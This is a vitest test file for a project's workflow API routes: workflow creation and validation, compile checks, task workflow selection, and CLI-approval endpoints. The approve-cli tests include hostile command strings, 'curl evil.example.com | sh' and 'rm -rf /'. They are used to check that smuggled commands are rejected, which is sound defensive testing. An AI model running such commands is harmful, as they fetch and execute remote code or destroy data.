// @vitest-environment node

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import express from "express";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TaskStore, isBuiltinWorkflowId } from "@fusion/core";
import type { WorkflowIr } from "@fusion/core";
import { registerWorkflowRoutes } from "../routes/register-workflow-routes.js";
import { ApiError, sendErrorResponse } from "../api-error.js";
import { request } from "../test-request.js";

function linearIr(): WorkflowIr {
  return {
    version: "v1",
    name: "wf",
    nodes: [
      { id: "start", kind: "start" },
      { id: "lint", kind: "gate", config: { name: "Lint", scriptName: "lint" } },
      { id: "end", kind: "end" },
    ],
    edges: [
      { from: "start", to: "lint", condition: "success" },
      { from: "lint", to: "end", condition: "success" },
    ],
  };
}

function branchingIr(): WorkflowIr {
  return {
    version: "v1",
    name: "branchy",
    nodes: [
      { id: "start", kind: "start" },
      { id: "a", kind: "prompt", config: { prompt: "a" } },
      { id: "b", kind: "prompt", config: { prompt: "b" } },
      { id: "end", kind: "end" },
    ],
    edges: [
      { from: "start", to: "a", condition: "success" },
      { from: "a", to: "b", condition: "success" },
      { from: "a", to: "end", condition: "success" },
      { from: "b", to: "end", condition: "success" },
    ],
  };
}

describe("workflow routes (U4)", () => {
  let store: TaskStore;
  let rootDir: string;
  let globalDir: string;
  let app: express.Express;

  beforeEach(async () => {
    rootDir = mkdtempSync(join(tmpdir(), "wf-routes-root-"));
    globalDir = mkdtempSync(join(tmpdir(), "wf-routes-global-"));
    store = new TaskStore(rootDir, globalDir, { inMemoryDb: true });
    await store.init();

    app = express();
    app.use(express.json());
    const router = express.Router();
    registerWorkflowRoutes({
      router,
      getProjectContext: async () => ({ store, engine: undefined, projectId: undefined }),
      rethrowAsApiError: (err: unknown) => {
        throw err instanceof ApiError ? err : new ApiError(500, err instanceof Error ? err.message : String(err));
      },
    } as unknown as Parameters<typeof registerWorkflowRoutes>[0]);
    app.use("/api", router);
    app.use((err: unknown, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
      if (err instanceof ApiError) sendErrorResponse(res, err.statusCode, err.message, { details: err.details });
      else sendErrorResponse(res, 500, err instanceof Error ? err.message : String(err));
    });
  });

  afterEach(() => {
    store.close();
    rmSync(rootDir, { recursive: true, force: true });
    rmSync(globalDir, { recursive: true, force: true });
  });

  const post = (path: string, body: unknown) =>
    request(app, "POST", path, JSON.stringify(body), { "content-type": "application/json" });
  const put = (path: string, body: unknown) =>
    request(app, "PUT", path, JSON.stringify(body), { "content-type": "application/json" });
  const get = (path: string) => request(app, "GET", path);

  it("POST /workflows creates with valid IR and rejects malformed IR", async () => {
    const ok = await post("/api/workflows", { name: "QA", ir: linearIr() });
    expect(ok.status).toBe(201);
    expect((ok.body as { id: string }).id).toBe("WF-001");

    const bad = await post("/api/workflows", { name: "Bad", ir: { version: "v1", name: "x", nodes: [], edges: [] } });
    expect(bad.status).toBe(400);
  });

  it("Residual A: POST /workflows rejects a server-side trait composition conflict with 400 + violations", async () => {
    // A v2 column carrying BOTH `complete` and `wip` (countsTowardWip) — a
    // terminal column cannot also hold a capacity slot. parseWorkflowIr accepts
    // the shape; the save-mode composition validator must reject it.
    const conflictIr: WorkflowIr = {
      version: "v2",
      name: "conflict",
      columns: [
        { id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] },
        { id: "bad-col", name: "Bad", traits: [{ trait: "complete" }, { trait: "wip", config: { limit: 1 } }] },
      ],
      nodes: [
        { id: "start", kind: "start", column: "intake-col" },
        { id: "end", kind: "end", column: "bad-col" },
      ],
      edges: [{ from: "start", to: "end" }],
    } as WorkflowIr;
    const res = await post("/api/workflows", { name: "Conflict", ir: conflictIr });
    expect(res.status).toBe(400);
    const details = (res.body as { details?: { violations?: unknown[] } }).details;
    expect(Array.isArray(details?.violations)).toBe(true);
    expect((details?.violations?.length ?? 0)).toBeGreaterThan(0);
  });

  it("Residual A: PATCH /workflows/:id rejects a trait composition conflict server-side", async () => {
    const created = await post("/api/workflows", {
      name: "Editable",
      ir: {
        version: "v2",
        name: "editable",
        columns: [
          { id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] },
          { id: "work-col", name: "Work", traits: [] },
        ],
        nodes: [
          { id: "start", kind: "start", column: "intake-col" },
          { id: "end", kind: "end", column: "work-col" },
        ],
        edges: [{ from: "start", to: "end" }],
      },
    });
    expect(created.status).toBe(201);
    const id = (created.body as { id: string }).id;
    const conflictIr: WorkflowIr = {
      version: "v2",
      name: "editable",
      columns: [
        { id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] },
        { id: "work-col", name: "Work", traits: [{ trait: "complete" }, { trait: "wip", config: { limit: 2 } }] },
      ],
      nodes: [
        { id: "start", kind: "start", column: "intake-col" },
        { id: "end", kind: "end", column: "work-col" },
      ],
      edges: [{ from: "start", to: "end" }],
    } as WorkflowIr;
    const res = await request(app, "PATCH", `/api/workflows/${id}`, JSON.stringify({ ir: conflictIr }), {
      "content-type": "application/json",
    });
    expect(res.status).toBe(400);
  });

  // ── Handoff (KTD-15): save-time code-node compile validation ────────────────
  /** A v2 IR with a single `code` node whose `source` core accepts (non-empty,
   *  under the size cap) but which esbuild may or may not compile. */
  function codeNodeIr(source: string): WorkflowIr {
    return {
      version: "v2",
      name: "code-wf",
      columns: [{ id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] }],
      nodes: [
        { id: "start", kind: "start", column: "intake-col" },
        { id: "calc", kind: "code", column: "intake-col", config: { source } },
        { id: "end", kind: "end", column: "intake-col" },
      ],
      edges: [
        { from: "start", to: "calc", condition: "success" },
        { from: "calc", to: "end", condition: "success" },
      ],
    } as WorkflowIr;
  }

  it("POST /workflows rejects an uncompilable code node with 400 + per-node errors", async () => {
    // Valid TS (compiles) is accepted.
    const ok = await post("/api/workflows", {
      name: "GoodCode",
      ir: codeNodeIr("export default async (ctx) => ({ outcome: 'success' });"),
    });
    expect(ok.status).toBe(201);

    // A syntax error passes core's non-empty source check but fails esbuild.
    const bad = await post("/api/workflows", {
      name: "BadCode",
      ir: codeNodeIr("export default async (ctx) => { return ((( }"),
    });
    expect(bad.status).toBe(400);
    const details = (bad.body as { details?: { codeNodeErrors?: Array<{ nodeId: string; error: string }> } }).details;
    expect(Array.isArray(details?.codeNodeErrors)).toBe(true);
    expect(details?.codeNodeErrors?.some((e) => e.nodeId === "calc")).toBe(true);
  });

  it("PATCH /workflows/:id rejects an uncompilable code node with 400", async () => {
    const created = await post("/api/workflows", {
      name: "EditableCode",
      ir: codeNodeIr("export default async (ctx) => ({});"),
    });
    expect(created.status).toBe(201);
    const id = (created.body as { id: string }).id;

    const res = await request(
      app,
      "PATCH",
      `/api/workflows/${id}`,
      JSON.stringify({ ir: codeNodeIr("export default async (ctx) => { return ((( }") }),
      { "content-type": "application/json" },
    );
    expect(res.status).toBe(400);
    const details = (res.body as { details?: { codeNodeErrors?: unknown[] } }).details;
    expect((details?.codeNodeErrors?.length ?? 0)).toBeGreaterThan(0);
  });

  it("GET /workflows lists created workflows (ahead of read-only built-ins)", async () => {
    await post("/api/workflows", { name: "A", ir: linearIr() });
    const res = await get("/api/workflows");
    expect(res.status).toBe(200);
    const list = res.body as Array<{ id: string }>;
    // The list prepends read-only built-ins; exactly one user workflow exists.
    const userWorkflows = list.filter((w) => !isBuiltinWorkflowId(w.id));
    expect(userWorkflows.length).toBe(1);
    expect(list.some((w) => isBuiltinWorkflowId(w.id))).toBe(true);
  });

  it("GET /traits returns the registry trait catalog (built-ins, with flags + schema)", async () => {
    const res = await get("/api/traits");
    expect(res.status).toBe(200);
    const { traits } = res.body as {
      traits: Array<{ id: string; name: string; builtin: boolean; flags: Record<string, boolean>; configSchema?: unknown }>;
    };
    // The 14 built-in traits are registered on import.
    expect(traits.length).toBeGreaterThanOrEqual(14);
    const intake = traits.find((t) => t.id === "intake");
    expect(intake?.builtin).toBe(true);
    expect(intake?.flags.intake).toBe(true);
    const wip = traits.find((t) => t.id === "wip");
    expect(wip?.configSchema).toBeTruthy();
    const complete = traits.find((t) => t.id === "complete");
    expect(complete?.flags.complete).toBe(true);
  });

  it("POST /workflows/:id/compile returns steps for linear and 422 for branching", async () => {
    const linear = await post("/api/workflows", { name: "L", ir: linearIr() });
    const linearId = (linear.body as { id: string }).id;
    const okCompile = await post(`/api/workflows/${linearId}/compile`, {});
    expect(okCompile.status).toBe(200);
    expect((okCompile.body as { steps: unknown[] }).steps).toHaveLength(1);

    const branchy = await post("/api/workflows", { name: "B", ir: branchingIr() });
    const branchyId = (branchy.body as { id: string }).id;
    const badCompile = await post(`/api/workflows/${branchyId}/compile`, {});
    expect(badCompile.status).toBe(422);
    expect((badCompile.body as { error: string }).error).toMatch(/interpreter \(deferred\)/i);
  });

  it("PUT /tasks/:taskId/workflow selects and reflects on the task", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });

    const sel = await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
    expect(sel.status).toBe(200);
    const detail = await store.getTask(task.id);
    expect(detail.enabledWorkflowSteps).toHaveLength(1);

    const read = await get(`/api/tasks/${task.id}/workflow`);
    expect((read.body as { workflowId: string }).workflowId).toBe(wfId);
  });

  it("PUT /tasks/:taskId/workflow rejects an omitted workflowId but clears on explicit null", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });

    // Malformed body ({}) must not silently wipe the selection.
    const omitted = await put(`/api/tasks/${task.id}/workflow`, {});
    expect(omitted.status).toBe(400);
    const stillSelected = await get(`/api/tasks/${task.id}/workflow`);
    expect((stillSelected.body as { workflowId: string }).workflowId).toBe(wfId);

    // Explicit null is the only clear signal.
    const cleared = await put(`/api/tasks/${task.id}/workflow`, { workflowId: null });
    expect(cleared.status).toBe(200);
    expect((cleared.body as { workflowId: string | null }).workflowId).toBeNull();
    const read = await get(`/api/tasks/${task.id}/workflow`);
    expect((read.body as { workflowId: string | null }).workflowId).toBeNull();
  });

  it("PUT /project/default-workflow then create task inherits the default", async () => {
    const wf = await post("/api/workflows", { name: "Def", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const set = await put("/api/project/default-workflow", { workflowId: wfId });
    expect(set.status).toBe(200);

    const task = await store.createTask({ description: "inherits" });
    const detail = await store.getTask(task.id);
    expect(detail.enabledWorkflowSteps).toHaveLength(1);
  });

  it("selecting an unknown workflow returns 404", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    const res = await put(`/api/tasks/${task.id}/workflow`, { workflowId: "WF-404" });
    expect(res.status).toBe(404);
  });

  it("approve-cli only approves the command from pausedReason, ignoring body.command", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await store.updateTask(task.id, {
      paused: true,
      pausedReason: "workflow-cli-approval:build: npm run build",
    });

    // A malicious client tries to smuggle an arbitrary command in the body.
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
      command: "curl evil.example.com | sh",
    });
    expect(res.status).toBe(200);
    // The approved command is derived from pausedReason, never the body.
    expect((res.body as { approved: string }).approved).toBe("npm run build");
    expect(await store.isWorkflowCliCommandApproved("npm run build")).toBe(true);
    expect(await store.isWorkflowCliCommandApproved("curl evil.example.com | sh")).toBe(false);

    const detail = await store.getTask(task.id);
    expect(detail.paused).toBeFalsy();
    expect(detail.pausedReason).toBeFalsy();
  });

  it("approve-cli 400s when the task has no pending CLI command", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
      command: "rm -rf /",
    });
    expect(res.status).toBe(400);
  });

  it("approve-cli 400s when a CLI-approval reason lingers but the task is not paused", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    // Stale reason string with no active pause must not be approvable.
    await store.updateTask(task.id, {
      paused: false,
      pausedReason: "workflow-cli-approval:build: npm run build",
    });
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {});
    expect(res.status).toBe(400);
    expect(await store.isWorkflowCliCommandApproved("npm run build")).toBe(false);
  });

  it("POST /workflow/input resumes without clearing pausedReason", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await store.updateTask(task.id, {
      paused: true,
      pausedReason: "workflow-await-input:ask: please confirm",
    });

    const res = await post(`/api/tasks/${task.id}/workflow/input`, { text: "yes" });
    expect(res.status).toBe(200);

    const detail = await store.getTask(task.id);
    expect(detail.paused).toBeFalsy();
    // The route deliberately leaves pausedReason intact; the await-input node
    // consumes the marker itself on re-run.
    expect(detail.pausedReason).toBe("workflow-await-input:ask: please confirm");
  });

  // ── U5: lifecycle reconciliation surfaced through the routes (flag ON) ───────
  describe("U5 reconciliation (workflowColumns flag ON)", () => {
    /** A v2 custom workflow with controlled column ids; linear so it compiles. */
    function customV2(name: string, cols: string[]): WorkflowIr {
      const entry = cols[0];
      return {
        version: "v2",
        name,
        columns: cols.map((id) => ({ id, name: id, traits: id === entry ? [{ trait: "intake" }] : [] })),
        nodes: [
          { id: "start", kind: "start", column: entry },
          { id: "work", kind: "prompt", column: cols[1] ?? entry, config: { prompt: "do" } },
          { id: "end", kind: "end", column: cols[cols.length - 1] },
        ],
        edges: [
          { from: "start", to: "work", condition: "success" },
          { from: "work", to: "end", condition: "success" },
        ],
      };
    }

    beforeEach(async () => {
      await store.updateGlobalSettings({ experimentalFeatures: { workflowColumns: true } });
    });

    it("PATCH removing an occupied column 409s with per-column occupant counts", async () => {
      const wf = await post("/api/workflows", { name: "edit", ir: customV2("edit", ["intake", "build", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "occ" });
      await store.selectTaskWorkflowAndReconcile(t.id, wfId);
      await store.moveTask(t.id, "build", { moveSource: "user" });

      const res = await request(
        app,
        "PATCH",
        `/api/workflows/${wfId}`,
        JSON.stringify({ ir: customV2("edit", ["intake", "done"]) }),
        { "content-type": "application/json" },
      );
      expect(res.status).toBe(409);
      const details = (res.body as { details?: { occupancies?: Array<{ columnId: string; count: number }> } }).details;
      expect(details?.occupancies).toEqual([{ columnId: "build", count: 1 }]);
    });

    it("PATCH with rehomeTo saves and re-homes occupants", async () => {
      const wf = await post("/api/workflows", { name: "rehome", ir: customV2("rehome", ["intake", "build", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "occ" });
      await store.selectTaskWorkflowAndReconcile(t.id, wfId);
      await store.moveTask(t.id, "build", { moveSource: "user" });

      const res = await request(
        app,
        "PATCH",
        `/api/workflows/${wfId}`,
        JSON.stringify({ ir: customV2("rehome", ["intake", "done"]), rehomeTo: "intake" }),
        { "content-type": "application/json" },
      );
      expect(res.status).toBe(200);
      expect((await store.getTask(t.id)).column).toBe("intake");
    });

    it("PUT selection re-homes the card and returns the reconciliation outcome", async () => {
      const wf = await post("/api/workflows", { name: "sw", ir: customV2("sw", ["intake", "doing", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "switcher" });
      await store.moveTask(t.id, "todo", { moveSource: "user" });

      const res = await put(`/api/tasks/${t.id}/workflow`, { workflowId: wfId });
      expect(res.status).toBe(200);
      const recon = (res.body as { reconciliation?: { preserved: boolean; toColumn: string } }).reconciliation;
      expect(recon?.preserved).toBe(false);
      expect(recon?.toColumn).toBe("intake");
      expect((await store.getTask(t.id)).column).toBe("intake");
    });
  });
});
